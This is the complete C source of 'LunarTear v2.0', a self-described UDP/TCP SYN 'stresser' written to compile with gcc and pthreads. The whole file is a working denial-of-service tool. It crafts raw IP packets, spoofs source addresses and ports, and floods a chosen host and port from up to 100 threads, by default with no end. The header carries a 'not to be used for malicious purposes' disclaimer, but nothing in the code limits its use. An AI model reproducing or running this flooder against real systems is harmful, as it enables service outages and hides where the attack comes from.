/* 
           -- Made by @V3ded --
- Not to be used for malicious purposes. -
   -- Published under the GNU license --
     -- gcc LunarTear.c -pthread -lm --
*/

/*Standard libs*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h> 
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <argp.h>
#include <signal.h>
#include <time.h>  //srand(time(NULL))
#include <limits.h> //LONG_MAX
#include <math.h> //ceil(x)

/* Socket libs */
#include <sys/socket.h>
#include <netinet/tcp.h>   //Provides declarations for tcp header
#include <netinet/udp.h>   //Provides declarations for udp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <netdb.h>         //gethostname() 
#include <arpa/inet.h>     //inet_addr()

#define THREAD_LIMIT 100 
#define TCP IPPROTO_TCP //Anything outside ASCII range so it cant be selected with argp. 
#define UDP IPPROTO_UDP
#define MAX_HOSTNAME_SIZE 128 
#define SLEEPTIME 100000

/* Macros */
#define verbose(toPrint) if(isVERBOSE) printf(toPrint) //Verbose with no args
#define verbosea(toPrint,value) if (isVERBOSE) printf(toPrint,(value)) //Verbose with 1 arg
#define verboseva(toPrint,...) if (isVERBOSE) printf(toPrint,##__VA_ARGS__) //Verbose with n args.

/* Colors */
#define RED   "\x1B[31m"
#define GRN   "\x1B[32m"
#define YEL   "\x1B[33m"
#define BLU   "\x1B[34m"
#define MAG   "\x1B[35m"
#define CYN   "\x1B[36m"
#define WHT   "\x1B[37m"
#define RESET "\x1B[0m"

/* Typedefs */
typedef struct iphdr iphdr;
typedef struct tcphdr tcphdr;
typedef struct sockaddr_in sockaddr_in;
typedef struct ip ip;
typedef struct udphdr udphdr;
typedef struct hostent hostent;
typedef struct in_addr in_addr;
typedef struct argp_state argp_state; //TODO: Rename to TArgpState
typedef struct argp TArgp;

/* Argp variables */
const char *argp_program_version = "LunarTear v2.0";
static char doc[] = "LunarTear is a UDP/TCP SYN stresser";

/* Structs */
typedef struct {
    int hFlag   :1; //Host flag
    int pFlag   :1; //Port flag
    int tFlag   :1; //Thread flag
    int tcpFlag :1; //Using tcp
    int udpFlag :1; //Using udp
    int sIFlag  :1; //Spoof IP flag
    int sPFlag  :1; //Spoof port flag
    int PaFlag  :1; //Packet amount flag
    
    int asIFlag :1; //Active spoof source ip flag
    int asPFlag :1; //Active spoof port flag
    int aPaFlag :1; //Active packet amount flag
    
    //Return variables
    char *IP;
    char *sIP; 
    int  PORT;
    int  sPORT; 
    int  THREAD_COUNT;
    long PACKET_AMOUNT;
}   TOptions;
int isVERBOSE = 0;

typedef struct {
    iphdr       *iph;
    tcphdr      *tcph;
    udphdr      *udph; 
    sockaddr_in floodAddr;
    
    int         THREAD_COUNT;
    long        PACKET_AMOUNT;
}   TAttack;
//CONSIDER: Make an extra struct which includes THREAD_COUNT and PACKET_AMOUNT & include it in both structs?

void Banner() {
    puts("  _____                               _______                         ");
    puts(" |     |_.--.--.-----.---.-.----.    |_     _|.-----.---.-.----.      ");
    puts(" |       |  |  |     |  _  |   _|      |   |  |  -__|  _  |   _|      ");
    puts(" |_______|_____|__|__|___._|__|        |___|  |_____|___._|__|        ");
    puts("                                                                      ");
    puts("                                  .--/--.--___                        ");
    puts("                               .-:. . ........o                       ");
    puts("               ..-::-.       ./-.  -.       ..+                       ");
    puts("              -:   ..-..    -.   . .         ./                       ");
    puts("              //.. .. .-.. /./...r..         --                        ");
    puts("             -::      .--:.+.s-- :o      --.-                         ");
    puts("             :/.      .s--.:-+: -o:    -///                           ");
    puts("              :/.     .o::s:::.---  ..:///::::::///:--..              ");
    puts("               ./-.   -+-ss+:-:/..--..   ......----.---.              ");
    puts("           /:-.-------/o.:o+/:oo...--.           .----...             ");
    puts("          +:-.........--.ooso:+---..            .-.                   ");
    puts("      .:--... .--.......-s//-.--.             .--                     ");
    puts("     .--.....       ..---//-:---..          ----....                  ");
    puts("    /:-.           .-. .--..  --.......-...::-                        ");
    puts("   -::.         ..::  ./..    .:-.-..//                               ");
    puts("  .--...........-.--  .-       .: ...//                               ");
    puts("  :-...........   --  .         /://+//  Made by:                     ");
    puts("  .                /. -        .:.-/:-    :::     :::  ::::::::       ");
    puts("                   ./...      .:          :+:     :+: :+:    :+:      ");
    puts("                    .:.-.   .-.           +:+     +:+        +:+      ");
    puts("                     ---:   /             +#+     +:+     +#++:       ");
    puts("                      :/-.--               +#+   +#+         +#+      ");
    puts("                        -:.--               #+#+#+#   #+#    #+#      ");
    puts("                          --:.                ###      ########       ");
    printf("\n\tFor so long, all I could do was destroy.\n\t  But now, I have a chance to save something..");
    puts("                                                                      ");
    puts("                                                                      ");
}

unsigned short csum (unsigned short *buf, int nwords) {
    
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

return ~sum;
}


void INTHandler(int sig) {
    char *estregg[] = {"\n\t\t   Thank you for using LunarTear!\n", "\n\t\t\tRare pupper.\n"};

    signal(sig, SIG_IGN);
    printf(((rand() % 100) > 2) ? estregg[0] : estregg[1]);
    exit(-1);
}

//Makes new options struct
int NewOptions(TOptions *options) {

    int status = 1;

    options->hFlag   = 0;     
    options->pFlag   = 0;   
    options->tFlag   = 0;
    options->tcpFlag = 0;
    options->udpFlag = 0;
        
    options->IP = (char *)malloc(sizeof(char) * MAX_HOSTNAME_SIZE);
    if(!options->IP) {
        fprintf(stderr, RED "Failed to malloc() %d bytes for the IP!\n" RESET, sizeof(char) * 64); 
        status = 0;            
    }

    options->sIP = (char *)malloc(sizeof(char) * 64);
    if(!options->sIP) {
        fprintf(stderr, RED "Failed to malloc() %d bytes for the source IP!\n" RESET, sizeof(char) * 64); 
        status = 0;            
    }

    options->PORT  = 0;
    options->sPORT = 0;
    options->THREAD_COUNT = 0;

    return status;
}

int HostToIP(char *hostname, char *ip, size_t size) {
    int status = 0;

    if(hostname) {
        hostent *he;
        in_addr **addr_list;
        
        he = gethostbyname(hostname);
        if(he) {
            addr_list = (struct in_addr **)he->h_addr_list;
            strncpy(ip, inet_ntoa(*addr_list[0]), size);
            status = 1;
        }
    }
    return status;
} 

int isValidIP(char *IP) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, IP, &(sa.sin_addr));
}

//Parses user options
error_t ParseOptions(int key, char *arg, argp_state *state) {
    
    char tIP[50]; //Max IPv4 size is a lot smaller. Could use tIP[64], because options struct has 64 bytes malloced.
    char tsIP[50]; //IP to spoof;
    
    int  tPort = 0; //Temp variable
    int  tsPort = 0; //Port to spoof
    
    long tPACKET_AMOUNT = 0;

    int  tThread = 0; //Temp variable
    char tHost[MAX_HOSTNAME_SIZE]; //Temp variable
    int  r = 0;  //Return variable

    TOptions *args = state->input;

    switch(key) {    
        case 'h':   strncpy(tHost ,arg, MAX_HOSTNAME_SIZE -1);
                    if(HostToIP(tHost, tIP, 49)) {
                        args->hFlag = 1; 
                        strcpy(args->IP, tIP);
                    }
                    else 
                        fprintf(stderr, RED "Couldn't resolve the hostname!\n" RESET);
                    break;

        case 'p':   tPort = atoi(arg);
					if(tPort < 1 || tPort > 65535) 
                        fprintf(stderr, RED "Port needs to be a number between 1 and 65535!\n" RESET);
					else {
						args->pFlag = 1;
                        args->PORT = tPort;
                    } 
                    break;
        
        case 't':   tThread = atoi(arg);
                    if(tThread < 1 || tThread > THREAD_LIMIT) 
                        fprintf(stderr,RED "Thread count needs to be a number between 1 and %d!\n" RESET, THREAD_LIMIT);
					else {
						args->tFlag = 1; 
                        args->THREAD_COUNT = tThread;
                    }
                    break;

        case TCP:   if(!args->udpFlag) { 
                        args->tcpFlag = 1;
                    }
                    else {
                        fprintf(stderr, RED "ERROR: Can't set two flood methods at once at once. Will use the first one...\n" RESET); 
                        sleep(1.5);
                    }
                    break;
        
        case UDP:   if(!args->tcpFlag) {
                        args->udpFlag = 1;
                    }
                    else { 
                        fprintf(stderr,RED "ERROR: Can't set two flood methods at once at once. Will use the first one...\n" RESET); 
                        sleep(1.5);
                    }
                    break;

        //Spoof source IP
        case 777:   strncpy(tsIP ,arg, 49);
                    args->asIFlag = 1;
                    if(isValidIP(tsIP)) {
                        args->sIFlag = 1;
                        strncpy(args->sIP, tsIP, 63);
                    }
                    else 
                        fprintf(stderr,RED "%s is an invalid spoof IP!\n" RESET, tsIP);
                    break;

        //Spoof source PORT
        case 778:   tsPort = atoi(arg);
                    args->asPFlag = 1;
					if(tsPort < 1 || tsPort > 65535) 
                        fprintf(stderr, RED "Spoof port needs to be a number between 1 and 65535!\n" RESET);
					else {
						args->sPFlag = 1;
                        args->sPORT = tsPort;
                    } 
                    break;

        //Packet amount
        case 779:   tPACKET_AMOUNT = atoi(arg);
                    args->aPaFlag = 1;
					if(tPACKET_AMOUNT < 1 || tPACKET_AMOUNT > LONG_MAX) 
                        fprintf(stderr, RED "Amount of packets to be sent needs to be bigger than 0 AND smaller than %ld!\n" RESET, LONG_MAX);
					else {
						args->PaFlag = 1;
                        args->PACKET_AMOUNT = tPACKET_AMOUNT;
                    } 
                    break;

        case 'v':   isVERBOSE = 1; 
                    break;

        default:    r = ARGP_ERR_UNKNOWN;  
                    break;  
    }

    return r;
}

// Responsible for checking all the required options.
// I know this is horrible, but it works...
int CheckOptions(TOptions *userOptions) { 
    int status = 0;

    if(((userOptions)->hFlag && (userOptions)->pFlag && (userOptions)->tFlag) && ((userOptions)->tcpFlag || (userOptions)->udpFlag)) {
        status = 1;

       if(userOptions->asIFlag && !userOptions->sIFlag)  
            status = 0;
        
        if(userOptions->asPFlag && !userOptions->sPFlag) 
            status = 0;
            
        if(userOptions->aPaFlag && !userOptions->PaFlag) 
            status = 0;
    }

    return status;
}

int GetOptions(int argc, char *argv[], TOptions *userOptions) {
    int status = 0;

    int r = NewOptions(userOptions); 
    if(r) {
        struct argp_option argpOptions[] = 
        {
            {0,0,0,0, "REQUIRED OPTIONS:" },
            {"host",'h', "HOST",0, "[*] Host to flood"},
            {"port",'p', "PORT",0 , "[*] Port to flood on the host"},
            {"threads", 't', "NUM", 0, "[*] Amount of threads to use [MAX = 100]"},
            {0,0,0,0, "CHOOSE ONE:" },
            {"tcp", TCP, 0, 0, "[*] Using TCP SYN flooding"},
            {"udp", UDP, 0, 0, "[*] Using UDP flooding"},
            {0,0,0,0, "OPTIONAL OPTIONS:" },
            {"spoof-ip", 777, "IP", 0, "Spoofs originating IP (Only works on LAN...)"}, //CONSIDER: 777,778,779 in #define
            {"spoof-port", 778, "PORT", 0, "Spoofs originating PORT (Only works on LAN...)"},
            {"amount", 779, "NUM", 0, "Sends n amount of packets where n = amount. (Only a rough estimate...)"},
            {"verbose", 'v', 0, OPTION_ARG_OPTIONAL, "Verbose output"},
            {0}
        };

        TArgp argp = {argpOptions, ParseOptions, 0, doc}; 
        argp_parse(&argp, argc, argv, 0, 0, userOptions);

        status = CheckOptions(userOptions);
    }

    return status;
}

void DisplayData(TOptions *options, int isVerbose, int method) {
    
    char *floodMethod[] = {"TCP SYN", "UDP"};
    char *state[]       = {"true" , "false"};

    printf("\n*-------------------------------------------------------------------*\n");
    printf("IP ADDRESS:    %s\n", options->IP);
    printf("TARGET PORT:   %d\n", options->PORT);
    printf("THREAD COUNT:  %d\n", options->THREAD_COUNT);
    printf("FLOODING TYPE: %s\n", floodMethod[(method == TCP) ? 0 : 1]);
    printf("IS VERBOSE:    %s\n", state[(isVerbose) ? 0 : 1]);
}

int RandIP(char *IP, size_t size) {
    int status = 1;
   
    if(IP) {
        int mask = 255;
        int IP1 = rand() % mask;
        int IP2 = rand() % mask;
        int IP3 = rand() % mask;
        int IP4 = rand() % mask;

        snprintf(IP, size, "%d.%d.%d.%d", IP1, IP2, IP3, IP4);
    }
    else 
        status = 0;

    return status;
}

int RandPORT() {
    return (rand() % 65535);
}

void Inform(int spoofPort) {
    verbosea("SOURCE PORT:   %d\n", spoofPort);
    printf("*-------------------------------------------------------------------*\n\n");
    printf("*---------------- STARTING THE FLOOD IN 2 SECONDS ------------------*\n");
    printf("*------------- HIDDEN OUTPUT UNLESS \"--verbose\" is set -------------*\n\n");
    sleep(2);

}
char datagram[4096];
void IPHeaderInit(TOptions *options, TAttack *attack) { 
    
    int method = (options->tcpFlag) ? TCP : UDP;
    char spoofIP[64];
    
    if(options->sIFlag)
        strncpy(spoofIP, options->sIP, 63);
    else
        RandIP(spoofIP, 63);
    verbosea("SOURCE IP:     %s\n", spoofIP);

    attack->iph = (iphdr *) datagram; //IP header

    attack->iph->tot_len = sizeof(ip) + ((method == TCP) ? sizeof(tcphdr) : sizeof(udphdr));
    attack->iph->protocol = method; //Our defines allow this because TCP = IPPROTO_TCP and UDP = IPPROTO_UDP
    attack->iph->ihl = 5;
    attack->iph->version = 4;
    attack->iph->tos = 0;        
    attack->iph->id = htons(13377);  //Id of this packet - CONSIDER: rand function
    attack->iph->frag_off = 0;
    attack->iph->ttl = 255;
    attack->iph->check = 0;      
    attack->iph->saddr = inet_addr(spoofIP);    
    attack->iph->daddr = inet_addr(options->IP);
    attack->iph->check = csum((unsigned short *)datagram, attack->iph->tot_len >> 1);

}

void TCPHeaderInit(TOptions *options, TAttack *attack) {

    attack->tcph = (tcphdr *)(datagram + sizeof(ip));
    int spoofPort = RandPORT();
    
    if(options->sPFlag) {
        spoofPort = options->sPORT;
        attack->tcph->source = htons(spoofPort);
    }
    else 
        attack->tcph->source = htons(spoofPort);
    Inform(spoofPort);

    attack->tcph->dest = htons(options->PORT);
    attack->tcph->seq = 0;
    attack->tcph->ack_seq = 0;
    attack->tcph->doff = 5;      
    attack->tcph->fin=0;
    attack->tcph->syn=1;
    attack->tcph->rst=0;
    attack->tcph->psh=0;
    attack->tcph->ack=0;
    attack->tcph->urg=0;
    attack->tcph->window = htons(5840); 
    attack->tcph->check = 0;
    attack->tcph->urg_ptr = 0;
}

void UDPHeaderInit(TOptions *options, TAttack *attack) {
        
    attack->udph = (udphdr *)(datagram + sizeof(ip));
    int spoofPort = RandPORT();

    if(options->sPFlag) {
        spoofPort = options->sPORT;
        attack->udph->source = htons(spoofPort);
    }
    else 
        attack->udph->source = htons(spoofPort); 
    Inform(spoofPort);

    attack->udph->dest = htons(options->PORT);
    attack->udph->len = htons(sizeof(udphdr));
    attack->udph->check = 0;
}


//Sets up an address to flood
void SockAddrInit(int PORT, char *IP, TAttack *attack) {
    attack->floodAddr.sin_family = AF_INET;
    attack->floodAddr.sin_port = htons(PORT);
    attack->floodAddr.sin_addr.s_addr = inet_addr(IP);
}

void HeaderInit(TOptions *options, TAttack *attack) {
    int method = (options->tcpFlag) ? TCP : UDP;
    
    SockAddrInit(options->PORT, options->IP, attack);
    IPHeaderInit(options, attack);
    attack->PACKET_AMOUNT = options->PACKET_AMOUNT;
    attack->THREAD_COUNT  = options->THREAD_COUNT;
    
    if(method == TCP)
        TCPHeaderInit(options, attack);
    if(method == UDP)
        UDPHeaderInit(options, attack);

}

//Makes socket
int MakeSocket() { 

    int sockFd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sockFd == -1) {
        fprintf(stderr, RED "Failed to setup the socket! Are you running as root? Raw sockets require root permissions.\n" RESET);        
        exit(-1); 
    }

    return sockFd;
}

void Send(int sockFd, TAttack *attack, long id) {
    
    if(sendto(sockFd, datagram, attack->iph->tot_len ,  0, (struct sockaddr *)&attack->floodAddr, sizeof(attack->floodAddr)) < 0) 
        perror("sendto() error:");
    else  
        verbosea("Volley sent! ID = %ld\n" , id);

}
/* This method is ugly, but floods forever. I don't like the code.
void LunarTear(int sockFd, TAttack *attack) {
    int id = 0;

    if(!attack->PACKET_AMOUNT) { // if packet amount == 0 (no user input), flood forever
        for(;;) {
            Send(sockFd, attack, id);
            usleep(100000);
            id++;
        }
    }
    else {
        long finalAmount = (attack->PACKET_AMOUNT / (long)attack->THREAD_COUNT); //Each thread divides packet amount
        for(;;) {
            Send(sockFd, attack, id);    
            if(id == finalAmount) 
                break;
             
            id++;        
            usleep(100000);
        }
    }
}
*/

// I'm willing to redo this method if someone proposes something sensible.
void LunarTear(int sockFd, TAttack *attack) {
    
    long double finalAmount = 0; 
 
    if(!attack->PACKET_AMOUNT) // if packet amount == 0 (no user input), flood forever (sort of. Takes ages before LONG_MAX is reached)
        finalAmount = LONG_MAX; 
    else
        finalAmount = ceil(((long double)attack->PACKET_AMOUNT / (long double)attack->THREAD_COUNT)); //Only a rough estimate! if thread count > amount, amount of packets sent = thread count.

    for(long i = 0; i < finalAmount; i++) {
        Send(sockFd, attack, i);
        usleep(SLEEPTIME);
    }
}

void *Flood(TAttack *attack) {
    int sockFd  = MakeSocket();
    
    int i = 1;
    const int *j = &i;
    if(setsockopt(sockFd, IPPROTO_IP, IP_HDRINCL, j, sizeof(i)) < 0) 
       perror("HDRINCL error:");
    
    LunarTear(sockFd, attack);
    pthread_exit(NULL);
}

int ThreadInit(int THREAD_COUNT, pthread_t tid[], TAttack *a) {
     
    int status = 1;
    pthread_attr_t attr;
	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

    for (int i = 0; i < THREAD_COUNT; i++) {
        if(pthread_create(&tid[i], &attr, (void *)Flood, a) != 0) {
            fprintf(stderr, RED "Error: Can't create thread #%d\n" RESET, i);
            status = 0;
        }
        usleep(100); 
        verbosea("Created thread #%d\n", i);
    }
    verbose("Threads were successfully created.\n\n");

    printf(CYN "\t ========== FLOODING HAS BEEN STARTED! ===========\n" RESET);
    printf(CYN "\t      ========== CTRL + C to cancel ==========\n" RESET);
    return status;
}

void ThreadJoin(int THREAD_COUNT, pthread_t tid[]) {

    for(int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(tid[i], NULL);
        verbosea("Closed thread #%d\n", i);
    }
    
    verbose("Threads were successfully closed.\n");
}

int InitVars(TOptions **options, TAttack **attack) {
    int status = 0;
    
    *options = (TOptions *)malloc(sizeof(TOptions)); 
    *attack =  (TAttack *)malloc(sizeof(TAttack));
    
    if(*attack && *options) 
        status = 1;

    
    return status;
}

void End(int THREAD_COUNT, pthread_t tid[]) {
    ThreadJoin(THREAD_COUNT, tid);
    printf("\n\t\t\t  All packets sent!");
    printf("\n\t\t   Thank you for using LunarTear!\n");
}

int main(int argc, char *argv[]) {
    srand(time(NULL));
    Banner(); 
    signal(SIGINT, INTHandler); 

    TOptions *userOptions;
    TAttack  *attack;
    pthread_t  tid[THREAD_LIMIT]; 
    
    if(InitVars(&userOptions, &attack)) { 
        if(GetOptions(argc, argv, userOptions)) {

            DisplayData(userOptions, isVERBOSE, (userOptions->tcpFlag) ? TCP : UDP);
            HeaderInit(userOptions, attack);  
            if(!ThreadInit(userOptions->THREAD_COUNT, tid, attack))
                fprintf(stderr, RED "Error in the flooding function/s.\n" RESET);

            End(userOptions->THREAD_COUNT, tid);
        }
        else
            fprintf(stderr,  RED "Are you setting all required arguments? (Marked with [*]).\nCheck out \"%s --help\" for more information.\n" RESET, argv[0]); 
    }
    else 
        fprintf(stderr, RED "Can't complete the flooding, the attack struct or options struct is NULL! Failed malloc()!\n" RESET); 
    
    return 0;
}
